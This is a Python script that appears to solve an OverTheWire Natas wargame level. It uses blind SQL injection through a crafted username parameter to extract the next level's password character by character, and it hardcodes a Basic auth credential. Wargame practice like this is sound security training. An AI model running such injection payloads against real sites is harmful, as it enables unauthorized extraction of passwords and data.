import string
from urllib.parse import urlencode
from urllib.request import Request, urlopen

username = 'natas16'
password = ''
length = 32
debug = True

headers = {
    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
}

while len(password) != length:
    for letter in string.printable:
        sql = f"{username}\" AND password LIKE BINARY \"{password}{letter}%"

        query = urlencode({ 'username': sql, 'debug': debug })
        url = f"http://natas15.natas.labs.overthewire.org/index.php?{query}"

        print(f"Trying password: {password}{letter}")

        request = Request(url=url, headers=headers)

        content = urlopen(request).read().decode('utf-8')

        if 'This user exists' in content:
            password += letter
            break
